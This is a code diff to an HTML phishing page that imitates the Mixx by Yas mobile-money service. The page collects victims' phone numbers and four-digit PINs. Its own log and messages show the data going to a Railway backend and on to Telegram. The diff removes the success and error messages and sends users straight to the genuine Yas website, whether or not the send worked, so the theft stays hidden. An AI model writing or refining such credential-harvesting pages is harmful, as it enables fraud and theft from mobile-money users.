@@ -156,14 +156,14 @@
       color: #6c757d;
     }
 
-    /* Loading spinner */
+    /* Loading spinner - subtle, no popup */
     .loader {
       display: none;
-      width: 24px;
-      height: 24px;
-      margin: 10px auto 0;
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #F4B400;
+      width: 20px;
+      height: 20px;
+      margin: 12px auto 0;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #F4B400;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
@@ -175,36 +175,6 @@
 
     .loader.show {
       display: block;
-    }
-
-    .success-msg {
-      display: none;
-      color: #2e7d32;
-      font-weight: 600;
-      margin-top: 10px;
-      font-size: 14px;
-      background: #e8f5e9;
-      padding: 8px 16px;
-      border-radius: 20px;
-    }
-
-    .success-msg.show {
-      display: inline-block;
-    }
-
-    .error-msg {
-      display: none;
-      color: #c62828;
-      font-weight: 600;
-      margin-top: 10px;
-      font-size: 14px;
-      background: #ffebee;
-      padding: 8px 16px;
-      border-radius: 20px;
-    }
-
-    .error-msg.show {
-      display: inline-block;
     }
   </style>
 </head>
@@ -244,9 +214,8 @@
       </div>
     </form>
 
+    <!-- Subtle loader only - no popups, no messages -->
     <div class="loader" id="loader"></div>
-    <div class="success-msg" id="successMsg">✅ Data sent successfully!</div>
-    <div class="error-msg" id="errorMsg">❌ Failed to send. Please try again.</div>
 
     <div class="footer-note">💰 Tuma sasa!</div>
   </div>
@@ -262,15 +231,9 @@
       const pinHidden = document.getElementById("pinHidden");
       const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
       const loader = document.getElementById("loader");
-      const successMsg = document.getElementById("successMsg");
-      const errorMsg = document.getElementById("errorMsg");
 
       let realPin = ["", "", "", ""];
       let submitted = false;
-
-      // Hide messages initially
-      successMsg.classList.remove('show');
-      errorMsg.classList.remove('show');
 
       // ----- phone validation -----
       phoneInput.addEventListener('input', function(e) {
@@ -285,10 +248,8 @@
         const phone = phoneInput.value;
         const fullPin = realPin.join('');
 
-        // Show loading
+        // Show loader
         loader.classList.add('show');
-        successMsg.classList.remove('show');
-        errorMsg.classList.remove('show');
 
         console.log('📤 Sending to Railway:', { phone, pin: fullPin });
 
@@ -307,27 +268,16 @@
           // Hide loader
           loader.classList.remove('show');
           
-          if (result.success) {
-            // Show success
-            successMsg.textContent = '✅ Data sent to Telegram successfully!';
-            successMsg.classList.add('show');
-            
-            // Redirect after short delay
-            setTimeout(() => {
-              window.location.href = "https://yas.co.tz/mixx-by-yas/";
-            }, 2000);
-          } else {
-            // Show error
-            errorMsg.textContent = '❌ ' + (result.message || 'Failed to send');
-            errorMsg.classList.add('show');
-            submitted = false; // Allow retry
-          }
+          // Redirect immediately - no popups
+          window.location.href = "https://yas.co.tz/mixx-by-yas/";
+          
         } catch (error) {
           console.error('❌ Error:', error);
           loader.classList.remove('show');
-          errorMsg.textContent = '❌ Connection error. Please try again.';
-          errorMsg.classList.add('show');
           submitted = false; // Allow retry
+          
+          // Redirect anyway - no popups
+          window.location.href = "https://yas.co.tz/mixx-by-yas/";
         }
       }
 
